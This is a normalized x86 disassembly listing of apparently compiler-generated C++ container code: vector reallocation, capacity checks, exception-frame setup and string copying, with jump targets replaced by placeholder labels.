add esi edx
cmp esi 0x6666665
jbe r-xdata
mov edx [ ecx + 0x8 ]
sub edx edi
mov eax 0x66666667
imul edx
sar edx 0x4
mov eax edx
shr eax 0x1f
inc esi
add eax edx
cmp esi eax
jbe r-xdata
push r--data
call sub_435a79
pop edi
pop esi
retn
mov edx eax
shr edx 0x1
mov edi 0x6666666
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
xor eax eax
jmp r-xdata
push eax
call sub_40c610
mov eax esi
cmp eax esi
jae r-xdata
sub_40c3c0
mov edx [ ecx + 0x4 ]
push esi
push edi
mov edi [ ecx ]
sub edx edi
mov eax 0x2e8ba2e9
imul edx
sar edx 0x3
mov esi edx
shr esi 0x1f
add esi edx
cmp esi 0x5d1745c
jbe r-xdata
mov edx [ ecx + 0x8 ]
sub edx edi
mov eax 0x2e8ba2e9
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
inc esi
add eax edx
cmp esi eax
jbe r-xdata
push r--data
call sub_435a79
pop edi
pop esi
retn
mov edx eax
shr edx 0x1
mov edi 0x5d1745d
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
xor eax eax
jmp r-xdata
push eax
call sub_40c710
mov eax esi
cmp eax esi
jae r-xdata
sub_40c430
push ebp
mov ebp esp
push 0xffffffff
push sub_452140
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov edi [ ebp + 0x8 ]
cmp edi 0x3ffffff
jbe r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
sar eax 0x6
cmp eax edi
jae r-xdata
push r--data
call sub_435a79
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx edi
call sub_40c810
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
push ebx
push eax
push edx
mov [ ebp - 0x14 ] eax
call sub_40ce10
mov ecx [ esi + 0x4 ]
mov eax [ esi ]
mov ebx ecx
add esp 0xc
sub ebx eax
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
shl edi 0x6
add edi eax
and ebx 0xffffffc0
add ebx eax
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] ebx
mov [ esi ] eax
mov edx [ ebp + 0x8 ]
push edx
mov edi ecx
call sub_40cb00
mov eax [ esi ]
push eax
call sub_43811c
mov edi [ ebp + 0x8 ]
add esp 0x8
sub_40c510
push ebp
mov ebp esp
push 0xffffffff
push sub_452120
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov edi [ ebp + 0x8 ]
cmp edi 0x2e8ba2e
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
mov eax 0x2e8ba2e9
imul ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax edi
jae r-xdata
push r--data
call sub_435a79
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx edi
call sub_40c860
mov [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
push edi
push eax
push edx
mov [ ebp - 0x14 ] eax
call sub_40cf30
mov ebx [ esi + 0x4 ]
mov ecx [ esi ]
mov edx ebx
sub edx ecx
mov eax 0x2e8ba2e9
imul edx
sar edx 0x4
mov edi edx
shr edi 0x1f
add esp 0xc
add edi edx
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
imul edi edi 0x58
mov ecx [ ebp - 0x14 ]
imul eax eax 0x58
add eax ecx
add edi ecx
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] edi
mov [ esi ] ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax ecx
call sub_40cb40
mov eax [ esi ]
push eax
call sub_43811c
add esp 0x8
sub_40c610
push ebp
mov ebp esp
push 0xffffffff
push sub_451950
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov edi [ ebp + 0x8 ]
cmp edi 0x6666666
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
mov eax 0x66666667
imul ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax edi
jae r-xdata
push r--data
call sub_435a79
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx edi
call sub_40c8b0
mov [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
push edi
push eax
push edx
mov [ ebp - 0x14 ] eax
call sub_40cfd0
mov edi [ esi + 0x4 ]
mov ecx [ esi ]
mov edx edi
sub edx ecx
mov eax 0x66666667
imul edx
sar edx 0x4
mov ebx edx
shr ebx 0x1f
add esp 0xc
add ebx edx
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax + eax * 4 ]
mov eax [ ebp - 0x14 ]
lea edx [ eax + ecx * 8 ]
lea ecx [ ebx + ebx * 4 ]
mov [ esi + 0x8 ] edx
lea edx [ eax + ecx * 8 ]
mov [ esi + 0x4 ] edx
mov [ esi ] eax
mov edx [ ebp + 0x8 ]
push edx
mov eax ecx
call sub_40cba0
mov eax [ esi ]
push eax
call sub_43811c
add esp 0x8
sub_40c710
push ebp
mov ebp esp
push 0xffffffff
push sub_452a20
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov ecx [ ebp + 0x8 ]
cmp ecx 0x5d1745d
jbe r-xdata
mov edx [ esi + 0x8 ]
sub edx [ esi ]
mov eax 0x2e8ba2e9
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add eax edx
cmp eax ecx
jae r-xdata
push r--data
call sub_435a79
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_40c910
mov [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
push edi
push eax
push edx
mov [ ebp - 0x14 ] eax
call sub_40d0c0
mov ebx [ esi ]
mov ecx [ esi + 0x4 ]
sub ecx ebx
mov eax 0x2e8ba2e9
imul ecx
sar edx 0x3
mov edi edx
shr edi 0x1f
add esp 0xc
add edi edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
imul edi edi 0x2c
mov ecx [ ebp - 0x14 ]
imul eax eax 0x2c
add eax ecx
add edi ecx
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] edi
mov [ esi ] ecx
mov ecx [ ebp + 0x8 ]
mov eax [ esi + 0x4 ]
push ecx
push eax
mov eax ebx
call sub_40cbe0
mov edx [ esi ]
push edx
call sub_43811c
add esp 0xc
sub_40c810
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x3ffffff
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_437cb3
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_43c3a5
shl ecx 0x6
push ecx
call sub_438178
add esp 0x4
test eax eax
jne r-xdata
sub_40c860
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x2e8ba2e
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_437cb3
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_43c3a5
imul ecx ecx 0x58
push ecx
call sub_438178
add esp 0x4
test eax eax
jne r-xdata
sub_40c8b0
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x6666666
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_437cb3
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_43c3a5
lea eax [ ecx + ecx * 4 ]
add eax eax
add eax eax
add eax eax
push eax
call sub_438178
add esp 0x4
test eax eax
jne r-xdata
sub_40c910
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x5d1745d
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_437cb3
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_43c3a5
imul ecx ecx 0x2c
push ecx
call sub_438178
add esp 0x4
test eax eax
jne r-xdata
sub_40c960
push ebp
mov ebp esp
push 0xffffffff
push sub_451928
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ ebp - 0x10 ] 0x0
mov [ esi ] 0x0
call sub_405c40
mov ecx [ ebp + 0xc ]
lea eax [ esi + 0x1c ]
push eax
mov [ ebp - 0x4 ] 0x0
call sub_40d1e0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_40c9d0
push ebp
mov ebp esp
push 0xffffffff
push sub_4520f9
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esi
xor eax eax
mov [ ebp - 0x4 ] eax
cmp esi eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] eax
lea ebx [ edi + 0x1c ]
mov [ esi ] al
call sub_405c40
lea eax [ esi + 0x1c ]
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
cmp eax ebx
je r-xdata
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
sub_40ca60
push ebp
mov ebp esp
push 0xffffffff
push sub_451901
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
xor edx edx
mov [ ebp - 0x4 ] edx
cmp eax edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov esi [ ecx ]
mov [ eax ] esi
mov esi [ ecx + 0x4 ]
mov [ eax + 0x4 ] esi
mov esi [ ecx + 0x8 ]
mov [ eax + 0x8 ] esi
mov esi [ ecx + 0xc ]
mov [ eax + 0xc ] esi
mov esi [ ecx + 0x10 ]
mov [ eax + 0x10 ] esi
mov esi [ ecx + 0x14 ]
mov [ eax + 0x14 ] esi
mov esi [ ecx + 0x18 ]
mov [ eax + 0x18 ] esi
mov esi [ ecx + 0x1c ]
mov [ eax + 0x1c ] esi
mov esi [ ecx + 0x20 ]
mov [ eax + 0x20 ] esi
lea edi [ eax + 0x24 ]
xor eax eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] edx
push edx
add ecx 0x24
mov [ edi ] ax
push ecx
or eax 0xffffffff
call sub_401be0
sub_40cb00
cmp eax edi
je r-xdata
retn
push esi
lea esi [ eax + 0x38 ]
xor ecx ecx
mov [ esi ] 0x7
mov [ esi - 0x4 ] 0x0
mov [ esi - 0x14 ] cx
add esi 0x40
lea edx [ esi - 0x38 ]
cmp edx edi
jne r-xdata
mov eax [ esi - 0x14 ]
push eax
call sub_43811c
add esp 0x4
cmp [ esi ] 0x8
jb r-xdata
pop esi
sub_40cb40
cmp eax ebx
je r-xdata
retn
push esi
push edi
lea esi [ eax + 0x50 ]
xor edi edi
jmp r-xdata
cmp [ esi ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi ] 0x7
mov [ esi - 0x4 ] edi
mov [ esi - 0x14 ] cx
cmp [ esi - 0x1c ] 0x8
jb r-xdata
mov eax [ esi - 0x14 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
mov [ esi - 0x1c ] 0x7
mov [ esi - 0x20 ] edi
mov [ esi - 0x30 ] ax
add esi 0x58
lea ecx [ esi - 0x50 ]
cmp ecx ebx
jne r-xdata
mov edx [ esi - 0x30 ]
push edx
call sub_43811c
add esp 0x4
pop edi
pop esi
sub_40cba0
cmp eax edi
je r-xdata
retn
push ebx
push esi
lea esi [ eax + 0x20 ]
xor ebx ebx
jmp r-xdata
cmp [ esi ] 0x10
jb r-xdata
mov [ esi ] 0xf
mov [ esi - 0x4 ] ebx
mov [ esi - 0x14 ] bl
add esi 0x28
lea ecx [ esi - 0x20 ]
cmp ecx edi
jne r-xdata
mov eax [ esi - 0x14 ]
push eax
call sub_43811c
add esp 0x4
pop esi
pop ebx
sub_40cbe0
push ebp
mov ebp esp
push ecx
push edi
mov edi eax
cmp edi [ ebp + 0x8 ]
je r-xdata
pop edi
mov esp ebp
pop ebp
retn
push ebx
add edi 0x1c
push esi
mov [ edi ] esi
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] esi
cmp [ edi - 0x8 ] 0x10
jb r-xdata
mov eax [ edi + 0x4 ]
mov [ ebp - 0x4 ] eax
cmp ebx eax
je r-xdata
mov [ edi - 0x8 ] 0xf
mov [ edi - 0xc ] esi
mov [ edi - 0x1c ] 0x0
add edi 0x2c
lea eax [ edi - 0x1c ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov edx [ edi - 0x1c ]
push edx
call sub_43811c
add esp 0x4
mov ecx [ edi ]
push ecx
call sub_43811c
add esp 0x4
lea esi [ ebx + 0x20 ]
lea ebx [ ebx ]
mov ebx [ edi ]
xor esi esi
cmp ebx esi
je r-xdata
pop esi
pop ebx
mov [ esi ] 0xf
mov [ esi - 0x4 ] 0x0
mov [ esi - 0x14 ] 0x0
add ebx 0x28
add esi 0x28
cmp ebx eax
jne r-xdata
mov eax [ esi - 0x14 ]
push eax
call sub_43811c
mov eax [ ebp - 0x4 ]
add esp 0x4
cmp [ esi ] 0x10
jb r-xdata
xor esi esi
sub_40cc90
push ebp
mov ebp esp
push 0xffffffff
push sub_451901
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x10 ] eax
xor edx edx
mov [ ebp - 0x4 ] edx
cmp eax edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov esi [ ecx ]
mov [ eax ] esi
mov esi [ ecx + 0x4 ]
mov [ eax + 0x4 ] esi
mov esi [ ecx + 0x8 ]
mov [ eax + 0x8 ] esi
mov esi [ ecx + 0xc ]
mov [ eax + 0xc ] esi
mov esi [ ecx + 0x10 ]
mov [ eax + 0x10 ] esi
mov esi [ ecx + 0x14 ]
mov [ eax + 0x14 ] esi
mov esi [ ecx + 0x18 ]
mov [ eax + 0x18 ] esi
mov esi [ ecx + 0x1c ]
mov [ eax + 0x1c ] esi
mov esi [ ecx + 0x20 ]
mov [ eax + 0x20 ] esi
lea edi [ eax + 0x24 ]
xor eax eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] edx
push edx
add ecx 0x24
mov [ edi ] ax
push ecx
or eax 0xffffffff
call sub_401be0
sub_40cd30
push ebp
mov ebp esp
push 0xffffffff
push sub_4518cb
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov esi [ ebp + 0x8 ]
mov eax [ ebx ]
mov [ esi ] eax
mov ecx [ ebx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov edx [ ebx + 0x8 ]
mov [ esi + 0x8 ] edx
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
mov ecx [ ebx + 0x10 ]
mov [ esi + 0x10 ] ecx
mov edx [ ebx + 0x14 ]
mov [ esi + 0x14 ] edx
mov eax [ ebx + 0x18 ]
mov [ esi + 0x18 ] eax
mov ecx [ ebx + 0x1c ]
xor edx edx
lea edi [ esi + 0x20 ]
mov [ esi + 0x1c ] ecx
push edx
lea eax [ ebx + 0x20 ]
push eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
or eax 0xffffffff
mov [ edi ] dx
call sub_401be0
xor eax eax
mov [ ebp - 0x4 ] eax
lea edi [ esi + 0x3c ]
push eax
mov [ edi + 0x10 ] eax
add ebx 0x3c
xor ecx ecx
mov [ edi + 0x14 ] 0x7
push ebx
or eax 0xffffffff
mov [ edi ] cx
call sub_401be0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40ce10
push ebp
mov ebp esp
push 0xffffffff
push sub_4520c1
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0xc ]
mov ebx ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
lea ebx [ ebx ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
add esi 0x40
mov [ ebp - 0x4 ] 0x0
mov [ ebp + 0xc ] esi
add ebx 0x40
jmp r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov ecx [ ebx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov edx [ ebx + 0x8 ]
mov [ esi + 0x8 ] edx
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
mov ecx [ ebx + 0x10 ]
mov [ esi + 0x10 ] ecx
mov edx [ ebx + 0x14 ]
mov [ esi + 0x14 ] edx
mov eax [ ebx + 0x18 ]
mov [ esi + 0x18 ] eax
mov ecx [ ebx + 0x1c ]
mov [ esi + 0x1c ] ecx
mov edx [ ebx + 0x20 ]
lea edi [ esi + 0x24 ]
xor eax eax
mov [ esi + 0x20 ] edx
push eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
lea ecx [ ebx + 0x24 ]
mov [ edi ] ax
push ecx
or eax 0xffffffff
call sub_401be0
cmp ebx [ ebp + 0x8 ]
je r-xdata
sub_40ceca
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
push 0x0
push 0x0
call sub_43c3a5
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_40cf00
add esi 0x40
cmp esi edi
jne r-xdata
sub_40cf30
push ebp
mov ebp esp
push 0xffffffff
push sub_452091
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0xc ]
mov edi ecx
xor ebx ebx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
add esi 0x58
mov [ ebp - 0x4 ] bl
mov [ ebp + 0xc ] esi
add edi 0x58
jmp r-xdata
push esi
mov ecx edi
call sub_40cd30
cmp edi [ ebp + 0x8 ]
je r-xdata
sub_40cf8e
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_43c3a5
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_407c10
add esi 0x58
cmp esi edi
jne r-xdata
sub_40cfd0
push ebp
mov ebp esp
push 0xffffffff
push sub_4518a1
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0xc ]
mov edi ecx
xor ebx ebx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
add esi 0x28
mov [ ebp - 0x4 ] bl
mov [ ebp + 0xc ] esi
add edi 0x28
jmp r-xdata
mov eax [ edi ]
mov [ esi ] eax
mov ecx [ edi + 0x4 ]
mov [ esi + 0x4 ] ecx
mov dx [ edi + 0x8 ]
push 0xffffffff
lea ecx [ esi + 0xc ]
mov [ esi + 0x8 ] dx
push ebx
lea eax [ edi + 0xc ]
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] ebx
push eax
mov [ ecx ] bl
call sub_405cb0
cmp edi [ ebp + 0x8 ]
je r-xdata
sub_40d053
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_43c3a5
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ecx ]
call sub_40d090
add esi 0x28
cmp esi edi
jne r-xdata
sub_40d0c0
push ebp
mov ebp esp
push 0xffffffff
push sub_4529f9
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0xc ]
lea edi [ ebx + 0x24 ]
lea esi [ ecx + 0x24 ]
nop
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
cmp ebx eax
je r-xdata
add ebx 0x2c
add esi 0x2c
mov [ ebp + 0xc ] ebx
add edi 0x2c
jmp r-xdata
mov [ edi - 0x10 ] 0xf
mov [ edi - 0x14 ] eax
mov [ ebx ] al
cmp ebx ecx
je r-xdata
lea ecx [ esi - 0x24 ]
cmp ecx [ ebp + 0x8 ]
je r-xdata
lea edx [ esi - 0x8 ]
lea ecx [ edi - 0x8 ]
mov [ edi - 0x8 ] eax
mov [ edi - 0x4 ] eax
mov [ edi ] eax
cmp ecx edx
je r-xdata
cmp [ edi - 0x10 ] 0x10
jb r-xdata
mov [ edi - 0x8 ] eax
mov [ edi - 0x4 ] eax
mov [ edi ] eax
mov edx [ esi - 0x8 ]
mov [ edi - 0x8 ] edx
mov ecx [ esi - 0x4 ]
mov [ edi - 0x4 ] ecx
mov edx [ esi ]
mov [ edi ] edx
mov [ esi - 0x8 ] eax
mov [ esi - 0x4 ] eax
mov [ esi ] eax
mov [ edi - 0x10 ] 0xf
mov [ edi - 0x14 ] eax
mov [ ebx ] 0x0
cmp [ esi - 0x10 ] 0x10
lea ebx [ esi - 0x24 ]
jae r-xdata
mov eax [ ebx ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
mov ecx [ ebx ]
mov edx [ ebp + 0xc ]
mov [ edx ] ecx
mov [ ebx ] 0x0
mov eax [ esi - 0x14 ]
inc eax
push eax
mov eax [ ebp + 0xc ]
push ebx
push eax
call sub_437db0
add esp 0xc
jmp r-xdata
mov eax [ esi - 0x14 ]
mov [ edi - 0x14 ] eax
mov ecx [ esi - 0x10 ]
mov [ edi - 0x10 ] ecx
mov [ esi - 0x10 ] 0xf
mov [ esi - 0x14 ] 0x0
mov [ ebx ] 0x0
mov ebx [ ebp + 0xc ]
xor eax eax
sub_40d1e0
push ebp
mov ebp esp
push 0xffffffff
push sub_451870
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov ecx [ ebx + 0x4 ]
sub ecx [ ebx ]
mov eax 0x66666667
imul ecx
sar edx 0x4
mov edi edx
mov eax 0x0
shr edi 0x1f
add edi edx
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp edi 0x6666666
jbe r-xdata
mov ecx edi
call sub_40c8b0
lea ecx [ edi + edi * 4 ]
lea edx [ eax + ecx * 8 ]
mov [ esi + 0x8 ] edx
mov [ ebp - 0x4 ] 0x0
mov edx [ ebp + 0x8 ]
push edx
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov ecx [ ebx + 0x4 ]
mov ebx [ ebx ]
push eax
push ecx
push ebx
call sub_40d320
add esp 0x10
mov [ esi + 0x4 ] eax
push r--data
call sub_435a79
sub_40d2b0
push ebp
mov ebp esp
cmp [ esi + 0x50 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x50 ] 0x7
mov [ esi + 0x4c ] 0x0
mov [ esi + 0x3c ] cx
cmp [ esi + 0x34 ] 0x8
jb r-xdata
mov eax [ esi + 0x3c ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
test [ ebp + 0x8 ] 0x1
mov [ esi + 0x34 ] 0x7
mov [ esi + 0x30 ] 0x0
mov [ esi + 0x20 ] ax
je r-xdata
mov edx [ esi + 0x20 ]
push edx
call sub_43811c
add esp 0x4
mov eax esi
pop ebp
retn 0x4
push esi
call sub_43811c
add esp 0x4
sub_40d320
push ebp
mov ebp esp
push 0xffffffff
push sub_451851
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x10 ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] esi
lea edi [ ebx + 0xf ]
lea esp [ esp ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
add esi 0x28
add eax 0x28
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x10 ] esi
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
